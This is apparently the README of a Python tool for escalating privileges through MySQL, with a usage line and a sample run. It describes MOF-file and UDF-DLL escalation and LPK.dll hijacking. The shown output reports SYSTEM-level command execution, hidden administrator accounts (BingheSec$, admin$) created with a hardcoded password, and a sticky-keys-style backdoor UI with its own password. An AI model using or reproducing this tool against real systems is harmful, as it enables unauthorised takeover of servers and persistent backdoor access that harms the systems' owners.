# python-promoting-privileges
1.自动导出mof文件，

2.自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权

3.导出LPK.dll文件，劫持系统目录提权

4.写启动项有问题，已经注释掉 
#usage:
```python sec.py host port user pass```

#Response:
```
Last login: Wed Jul 6 17:13:31 on ttys001
BinghedeMac:~ BingheSec$ python /sec.py 192.168.1.10 3306 root root

  ===============================================================================
|                                                                               |
|                BingheSec Mysql Promote Privileges Tool                        |
|                                                                               |
  ===============================================================================
Usage as: sec.py host port user pass
Example: sec.py 192.168.1.6 3306 root 123456
Current connection: 192.168.1.10:3306/root/root
Mysql Version is 5.5.40
Mysql Version>5.0 , UDF dll can only dump to plugin dir!
Mysql RootPath : C:/Program Files/phpStudy/MySQL/
UDF DLL PATH : C:/Program Files/phpStudy/MySQL/lib/plugin/BingheSec.dll

UDf will make the user 'guest' active and add to admin with the pass 789456123+abc
The sql of Dumping AddUser And AddToAdmin MOF File has queried OK.
Press shift 5 times then press 1,2 at the same time to start the lpk UI,pass:binghesec
Mof and LPK will add users named BingheSec$/admin$ with password: 789456123+abc
Mof file only fit for windows2003 , please test it byourself!
Command Query Result:
-------------------------------------------------------------------------------

Microsoft Windows [版本 5.2.3790]
nt authority\system
命令成功完成。

命令成功完成。

命令成功完成。

别名 administrators
注释 管理员对计算机/域有不受限制的完全访问权

成员

-------------------------------------------------------------------------------

admin$
Administrator
BingheSec$
Guest
命令成功完成。
```
